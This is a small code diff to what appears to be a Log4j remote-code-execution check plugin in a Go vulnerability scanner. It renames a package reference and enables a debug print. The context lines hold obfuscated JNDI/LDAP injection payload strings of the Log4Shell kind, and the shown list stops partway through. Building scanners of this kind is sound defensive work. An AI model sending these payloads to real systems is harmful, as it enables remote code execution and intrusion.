@@ -43,7 +43,7 @@ func (d *log4jRCE) GetResult() []plugin.Plugin {
 
 func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 
-	domain := utils.GetHostFromUrl(URL)
+	domain := util.GetHostFromUrl(URL)
 
 	if domain == "" {
 		return false
@@ -52,7 +52,7 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 	_ = meta
 	// count := 0
 	randStr := domain + "." + utils.RandStringRunes(6)
-	// fmt.Println(randStr)
+	fmt.Println(randStr)
 	payloads := []string{
 		"${j${::-}n${::-}d${::-}i:l${::-}d${::-}a${::-}p://",
 		"${jndi:lda${:-}p://",
